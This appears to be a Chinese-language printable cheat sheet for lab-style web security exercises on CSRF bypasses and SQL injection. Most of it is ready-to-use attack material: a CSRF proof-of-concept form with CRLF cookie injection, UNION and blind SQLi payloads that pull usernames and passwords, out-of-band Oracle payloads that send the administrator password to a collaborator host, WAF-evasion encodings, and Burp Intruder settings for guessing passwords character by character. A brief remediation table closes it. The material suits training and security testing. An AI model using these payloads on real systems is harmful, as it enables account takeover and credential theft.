# 速查表 · CSRF + SQLi

> 打印版。左边是"看到什么防御/现象"，右边是"下一步做什么"。

---

## 一、CSRF 绕过矩阵

| 观察到的防御 | 绕过动作 | 关键代码 |
|--------------|----------|----------|
| 无防护 | 直接构造 POST 表单 | `<form action="..." method="POST">` |
| token 仅 POST 校验 | 改 GET，参数进 query | `<form action="...?email=x">`（默认 GET） |
| token 存在才校验 | 删除整个 token 参数 | body 里只留业务参数 |
| token 全局池（不绑 session） | 用攻击者账号的 token | 复制自己 `/my-account` 的 token |
| token 绑 `csrfKey` cookie | CRLF 写 cookie + 攻击者 token | `Set-Cookie: csrfKey=<K>; SameSite=None` |
| 双提交（cookie==body） | CRLF 写 cookie + 自造 token | `Set-Cookie: csrf=<F>; SameSite=None` |
| Referer 存在才校验 | 不发 Referer | `<meta name="referrer" content="no-referrer">` |
| Referer 子串匹配 | 让完整 Referer 含目标域名 | `history.pushState("", "", "/?TARGET")` + `Referrer-Policy: unsafe-url` |
| SameSite=Lax | 改用 GET 型动作 / on-site gadget / 同站子域 | 顶层导航 GET 会带 cookie |

### 通用 PoC 骨架

```html
<html>
  <head>
    <!-- 需要控制 Referer 时用下面两行之一 -->
    <!-- <meta name="referrer" content="no-referrer"> -->
    <!-- <meta name="referrer" content="unsafe-url"> -->
  </head>
  <body>
    <form action="https://TARGET/path" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net">
      <!-- 需要 token / 自造 token 时加： -->
      <!-- <input type="hidden" name="csrf" value="VALUE"> -->
    </form>
    <!-- 需要先写 cookie：img 的 onerror 保证"先写 cookie、后提交" -->
    <img src="https://TARGET/?search=x%0d%0aSet-Cookie:%20csrfKey=K%3b%20SameSite=None"
         onerror="document.forms[0].submit()">
    <!-- 不需要写 cookie 时： -->
    <!-- <script>document.forms[0].submit();</script> -->
  </body>
</html>
```

### CRLF cookie 注入的三个必写项

```
%0d%0a     换行（CRLF）
%20        Set-Cookie: 后的空格
%3b        分号
; SameSite=None   否则跨站 POST 不带 cookie
```

### exploit server 流程

```
贴 HTML → Store → View exploit（自测邮箱真变了）→ Deliver to victim → 看横幅 Solved
（改过 payload 必须重新 Store，否则投的是旧页）
```

---

## 二、SQLi 跨 DBMS 语法

| 目的 | MySQL | MSSQL | Oracle | PostgreSQL |
|------|-------|-------|--------|------------|
| 注释 | `#` / `-- ` / `/**/` | `-- ` | `-- `（后须空格） | `-- ` |
| 版本 | `@@version` | `@@version` | `v$version` / `banner` | `version()` |
| 必须 FROM | 否 | 否 | **是**（`dual`） | 否 |
| 字符串拼接 | `CONCAT(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
| 数列数 | `ORDER BY n` | 同 | 同 | 同 |
| 截取 | `SUBSTRING`/`SUBSTR` | `SUBSTRING` | `SUBSTR` | `SUBSTRING` |
| 时间延迟 | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message(('a'),5)` | `pg_sleep(5)` |
| 堆叠查询 | 驱动相关 | 支持 | 不支持（PL/SQL 块） | 支持 |
| 列表 | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` |
| 列列 | `information_schema.columns` | 同 | `all_tab_columns` | 同（`table_schema='public'`） |
| 报错带数据 | `EXTRACTVALUE` | `CAST(x AS int)` | `EXTRACTVALUE`/`UTL_INADDR` | `CAST(x AS int)` |
| 标识符大小写 | 原样 | 不敏感 | **默认大写** | 小写 |

---

## 三、SQLi 阶段化 payload

### 1. 探测

```sql
'                        -- 破坏，看是否 500
''                       -- 恢复，确认是引号问题
'--  /  '#  /  '/*      -- 注释，看是否恢复
' AND '1'='1             -- 真
' AND '1'='2             -- 假（有差异 → 布尔通道）
' ORDER BY 1--           -- 数列数
' UNION SELECT NULL--    -- NULL 适配任意类型
```

### 2. UNION 取数

```sql
' UNION SELECT NULL,NULL,NULL--                       -- 3 列
' UNION SELECT 'a',NULL,NULL--                        -- 找字符列
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_x'--
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,username||'~'||password FROM users--     -- 单列拼接
```

### 3. 盲注

```sql
-- 布尔
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
-- 条件错误（Oracle）
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-- 时间（PostgreSQL）
xyz';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a')
      THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
-- 带外（Oracle）
xyz' UNION SELECT EXTRACTVALUE(xmltype('<%3fxml version="1.0"%3f><!DOCTYPE root [
      <!ENTITY %25 r SYSTEM "http://COLLAB/"> %25r;]>'),'/l') FROM dual--
-- 带外外带
... SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/" ...
```

### 4. WAF 绕过

```xml
<!-- XML 数字字符引用：检查点看到 &#x53;ELECT，解析器还原成 SELECT -->
<stockId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></stockId>
<!-- 等价手写 -->
<stockId>1 &#x55;NION &#x53;ELECT NULL</stockId>
```

其它廉价绕过（按成功率排序）：
1. 大小写 / 内联注释：`SeLeCt`、`UN/**/ION`、`SEL/*x*/ECT`
2. 空白替换：`%09`、`%0a`、`+`、`/**/`
3. 等价语法：`||` ↔ `CONCAT`、`SUBSTR` ↔ `MID`、`=` ↔ `LIKE` ↔ `IN`
4. 编码层：XML 实体、JSON `\u0053`、双重 URL 编码、UTF-16
5. 分块传输 / 参数污染（`id=1&id=2`）

---

## 四、Intruder 配置（盲注三件套）

| 设置 | 值 |
|------|-----|
| Attack type | Sniper |
| Payload position | 包住要猜的字符：`='§a§` |
| Payload list | `a`–`z`, `0`–`9`（密码可能含大写则加 `A`–`Z`） |
| Grep - Match | `Welcome back`（布尔通道） |
| 判定列 | 布尔：`Welcome back`；错误：`Status=500`；时间：`Response received` |
| 线程 | 布尔 5–10；时间 **1–2**（避免互相污染时间） |

### 提速：二分查找

```sql
SUBSTRING(...,1,1) > 'm'     -- 每次砍一半，36 次 → 6 次/字符
```

---

## 五、防御对照（写报告用）

| 漏洞 | 正确修复 |
|------|----------|
| CSRF | 每个会话一个不可预测 token，**服务端校验 token 与当前 session 绑定**；所有状态变更用 POST/PUT/DELETE；`SameSite=Lax/Strict` 作为纵深 |
| CSRF 双提交 | 仅在无法存服务端状态时使用，且必须保证没有 cookie 写入面（子域、CRLF、XSS） |
| SQLi | **参数化查询 / 预编译**（表名、列名、`ORDER BY` 用白名单）；最小权限数据库账号；错误信息不外泄；WAF 只作纵深 |
| WAF 绕过 | 不能只做文本匹配；在**解析后**的语义层校验；统一编码处理链 |
